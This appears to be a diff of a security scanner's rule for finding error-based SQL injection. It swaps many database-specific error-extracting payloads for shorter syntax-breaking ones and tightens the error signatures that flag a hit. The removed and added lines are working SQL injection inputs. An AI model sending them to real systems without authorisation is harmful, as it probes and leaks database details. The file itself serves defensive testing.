@@ -5,161 +5,214 @@ transform:
   query:
     transformations:
       - replace_all_values_one_by_one:
-          # ── Unclosed quotes / broken syntax (universal) ──
-          - "'"
-          - "'\""
-          - "' AND '"
-          - "\"--"
-          - "';"
           - "')--"
-          - "\")"
-          - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
-          # ── MySQL error extractors ──
-          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
-          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
-          - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
-          - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
-          - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          # ── PostgreSQL error extractors ──
-          - "' AND 1=CAST((SELECT version()) AS int)--"
-          - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
-          - "';SELECT CAST(version() AS int)--"
-          - "' AND TO_NUMBER(version(),'9')=0--"
-          # ── MSSQL error extractors ──
-          - "' AND 1=CONVERT(int,(SELECT @@version))--"
-          - "' AND 1=CONVERT(int,DB_NAME())--"
-          - "';DECLARE @v INT=CAST(@@version AS INT)--"
-          - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
-          # ── Oracle error extractors ──
-          - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
-          # ── SQLite error extractors ──
-          - "' AND 1=CAST(sqlite_version() AS int)--"
-          - "' UNION SELECT CAST(sqlite_version() AS int)--"
-          - "' AND TYPEOF(ZEROBLOB(-1))--"
+          - "\")--"
+          - "';--"
+          - "\";--"
+          - "'));"
+          - "' AND 1=CAST('abc' AS int)--"
   body:
     transformations:
       - replace_all_values_one_by_one:
-          # ── Unclosed quotes / broken syntax (universal) ──
-          - "'"
-          - "'\""
-          - "' AND '"
-          - "\"--"
-          - "';"
           - "')--"
-          - "\")"
-          - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
-          # ── MySQL error extractors ──
-          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
-          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
-          - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
-          - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
-          - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          # ── PostgreSQL error extractors ──
-          - "' AND 1=CAST((SELECT version()) AS int)--"
-          - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
-          - "';SELECT CAST(version() AS int)--"
-          - "' AND TO_NUMBER(version(),'9')=0--"
-          # ── MSSQL error extractors ──
-          - "' AND 1=CONVERT(int,(SELECT @@version))--"
-          - "' AND 1=CONVERT(int,DB_NAME())--"
-          - "';DECLARE @v INT=CAST(@@version AS INT)--"
-          - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
-          # ── Oracle error extractors ──
-          - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
-          # ── SQLite error extractors ──
-          - "' AND 1=CAST(sqlite_version() AS int)--"
-          - "' UNION SELECT CAST(sqlite_version() AS int)--"
-          - "' AND TYPEOF(ZEROBLOB(-1))--"
+          - "\")--"
+          - "';--"
+          - "\";--"
+          - "'));"
+          - "' AND 1=CAST('abc' AS int)--"
   header:
     transformations:
       - replace_all_values_one_by_one:
-          # ── Unclosed quotes / broken syntax (universal) ──
-          - "'"
-          - "'\""
-          - "' AND '"
-          - "\"--"
-          - "';"
-          # ── MySQL ──
-          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
-          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          # ── PostgreSQL ──
-          - "' AND 1=CAST((SELECT version()) AS int)--"
-          # ── MSSQL ──
-          - "' AND 1=CONVERT(int,(SELECT @@version))--"
+          - "')--"
+          - "\")--"
+          - "';--"
+          - "\";--"
+          - "'));"
+          - "' AND 1=CAST('abc' AS int)--"
 
 match_on:
   body:
     contains:
-      # ---- MySQL ----
-      - "you have an error in your sql syntax"
-      - "sql syntax error"
-      - "warning: mysql_"
-      - "mysql_fetch_array()"
-      - "mysql_num_rows()"
-      - "mysql_fetch_assoc()"
-      - "mysql_connect()"
-      - "EXTRACTVALUE"
-      - "UPDATEXML"
-      - "Duplicate entry"
-      # ---- PostgreSQL ----
-      - "pg_query()"
-      - "pg_exec()"
-      - "unterminated quoted string"
-      - "invalid input syntax for"
-      - "ERROR:  syntax error at or near"
-      - "current transaction is aborted"
-      # ---- MSSQL ----
-      - "unclosed quotation mark after the character string"
-      - "conversion failed when converting"
-      - "mssql_query()"
-      - "Microsoft OLE DB Provider"
-      - "Microsoft SQL Native Client"
-      - "Incorrect syntax near"
-      - "ODBC SQL Server Driver"
-      - "[SQL Server]"
-      # ---- Oracle ----
-      - "ORA-"
-      - "Oracle error"
-      - "quoted string not properly terminated"
-      - "oracle.jdbc.driver"
-      - "SQL command not properly ended"
-      # ---- SQLite ----
-      - "SQLite3::query()"
-      - "sqlite3.OperationalError"
-      - "SQLITE_ERROR"
-      - "unrecognized token"
-      - "near \".\":  syntax error"
-      # ---- Generic / Framework ----
-      - "SQLSTATE["
-      - "java.sql.SQLException"
-      - "org.hibernate.exception"
-      - "unknown column"
-      - "unterminated string literal"
-      - "PDOException"
-      - "System.Data.SqlClient"
-      - "Npgsql."
-      - "Syntax error in SQL statement"
-      - "SQL query syntax error"
-      - "Unexpected end of command"
+
+      - "You have an error in your SQL syntax; check the manual"
+      - "supplied argument is not a valid MySQL result"
+      - value: 'mysql_fetch_array\(\) expects parameter 1 to be resource'
+        options:
+          regex: true
+      - value: 'mysql_num_rows\(\) expects parameter 1 to be resource'
+        options:
+          regex: true
+      - value: 'mysql_fetch_assoc\(\) expects parameter 1 to be resource'
+        options:
+          regex: true
+      - "Duplicate entry '"
+      - "XPATH syntax error: '~"
+      - "Got error 'repeated'"
+      - value: 'Double value out of range in ''exp\(~'
+        options:
+          regex: true
+
+      - "ERROR:  invalid input syntax for type integer:"
+      - "ERROR:  unterminated quoted string at or near"
+      - "ERROR:  syntax error at or near \\\""
+      - "ERROR:  operator does not exist: integer ="
+      - "ERROR:  current transaction is aborted, commands ignored until end of transaction block"
+      - "invalid byte sequence for encoding"
+
+      - "Unclosed quotation mark after the character string"
+      - "Conversion failed when converting the"
+      - "Error converting data type"
+      - "Microsoft OLE DB Provider for SQL Server"
+      - "Microsoft SQL Server Native Client"
+      - "SQLServer JDBC Driver"
+      - value: '\[Microsoft\]\[ODBC SQL Server Driver\]'
+        options:
+          regex: true
+      - value: '\[SQL Server\]'
+        options:
+          regex: true
+      - "Incorrect syntax near '"
+      - value: 'Statement\(s\) could not be prepared'
+        options:
+          regex: true
+
+      # ── Oracle ──────────────────────────────────────────────────────────────
+      - "ORA-00904:"
+      - "ORA-00907:"
+      - "ORA-00933:"
+      - "ORA-00936:"
+      - "ORA-01031:"
+      - "ORA-01722:"
+      - "ORA-01756:"
+      - "ORA-01789:"
+      - "ORA-06512:"
+      - "ORA-20001:"
+      - "ORA-29257:"
+      - value: 'oracle\.jdbc\.driver\.OracleDriver'
+        options:
+          regex: true
+      - value: 'oracle\.jdbc\.OracleConnection'
+        options:
+          regex: true
+
+      # ── SQLite ───────────────────────────────────────────────────────────────
+      - "SQLITE_ERROR SQL error or missing database"
+      - "[SQLITE_ERROR]"
+      - "SQLITE_CONSTRAINT"
+      - "SQLite3::Exception:"
+      - "SQLiteException"
+      - "SqliteError"
+      - "SqliteException"
+      - value: 'SQLite3::query\(\): Unable to execute a query'
+        options:
+          regex: true
+      - value: 'sqlite3\.OperationalError:'
+        options:
+          regex: true
+      - 'unrecognized token: "'
+      - value: 'near "\.":\ syntax error'
+        options:
+          regex: true
+      - "no such table:"
+      - "no such column:"
+      - "has no column named"
+
+      - "org.h2.jdbc.JdbcSQLSyntaxErrorException"
+      - "org.h2.message.DbException"
+
+      # ── HSQLDB ───────────────────────────────────────────────────────────────
+      - "user lacks privilege or object not found"
+      - "org.hsqldb.jdbc.JDBCDriver"
+
+      - "DB2 SQL Error"
+      - "SQLCODE="
+
+      - "ISAM error:"
+
+      - "SybSQLException"
+      - "Sybase message"
+
+      - "Microsoft JET Database Engine"
+      - "Microsoft Access Database Engine"
+
+      - "net.snowflake.client.jdbc.SnowflakeSQLException"
+
+      - "ClickHouse exception"
+      - value: 'Code: \d+\. DB::Exception'
+        options:
+          regex: true
+
+      - value: 'SQLSTATE\[42000\]'
+        options:
+          regex: true
+      - value: 'SQLSTATE\[HY000\]'
+        options:
+          regex: true
+      - value: 'SQLSTATE\[22007\]'
+        options:
+          regex: true
+      - value: 'SQLSTATE\[22P02\]'
+        options:
+          regex: true
+      - value: 'java\.sql\.SQLException:'
+        options:
+          regex: true
+      - value: 'org\.hibernate\.exception\.SQLGrammarException'
+        options:
+          regex: true
+      - value: 'org\.hibernate\.exception\.DataException'
+        options:
+          regex: true
+      - "PDOException: SQLSTATE"
+      - value: 'System\.Data\.SqlClient\.SqlException'
+        options:
+          regex: true
+      - value: 'Microsoft\.Data\.SqlClient\.SqlException'
+        options:
+          regex: true
+      - value: 'Npgsql\.NpgsqlException'
+        options:
+          regex: true
+      - value: 'Npgsql\.PostgresException'
+        options:
+          regex: true
+      - value: 'PSQLException'
+        options:
+          regex: true
+      - "ActiveRecord::StatementInvalid"
+      - "PG::SyntaxError:"
+      - "PG::UndefinedTable:"
+      - "PG::UndefinedColumn:"
+      - value: 'Caused by: java\.sql\.SQLSyntaxErrorException'
+        options:
+          regex: true
+      - value: 'pq: syntax error at or near'
+        options:
+          regex: true
+      - value: 'cockroachdb.*syntax error'
+        options:
+          regex: true
+      - value: 'com\.datastax\.driver'
+        options:
+          regex: true
+      - "com.datastax.oss.driver.api.core.servererrors.SyntaxError"
+      - value: 'mysqli_sql_exception'
+        options:
+          regex: true
+
 
 report:
   title: "Error-based SQL Injection indicators found"
   description: >-
     Injecting SQL metacharacters and error-extracting payloads into individual
-    parameters caused the server to return database error signatures. Payloads
-    target MySQL, PostgreSQL, MSSQL, Oracle, and SQLite to force type-cast
-    errors, syntax violations, and function-based extraction.
+    parameters caused the server to return high-fidelity database error
+    signatures. Patterns matched are verbatim engine error strings, JDBC/ORM
+    exception class names, and SQLSTATE codes — not generic phrases that appear
+    in normal page content.
     Original: {{original.method}} {{original.url}}
-    Tested: {{req.method}} {{req.url}}
-    Status: {{res.status}} | Content-Type: {{res.headers.Content-Type}}
+    Tested:   {{req.method}} {{req.url}}
+    Matched:  {{match.criteria}}
+    Status:   {{res.status}} | Content-Type: {{res.headers.Content-Type}}
   severity: critical
   cwe: "CWE-89"
   cvssScore: "9.0"
@@ -170,7 +223,7 @@ report:
   stepsToReproduce: |
     1) Send the baseline request: {{original.method}} {{original.url}}
     2) Re-send while replacing a single parameter value with a syntax-breaking or error-extracting payload.
-    3) Observe response containing database error text (e.g., SQLSTATE[…], ORA-, syntax error, EXTRACTVALUE, CONVERT).
+    3) Observe response containing a verbatim database error (e.g., "You have an error in your SQL syntax", "ORA-00907", "Conversion failed when converting", "SQLSTATE[42000]").
     4) Repeat for other parameters to confirm the scope.
   tags: "sqli,error-based,owasp-a03,mysql,postgres,mssql,oracle,sqlite"
   impact: >-
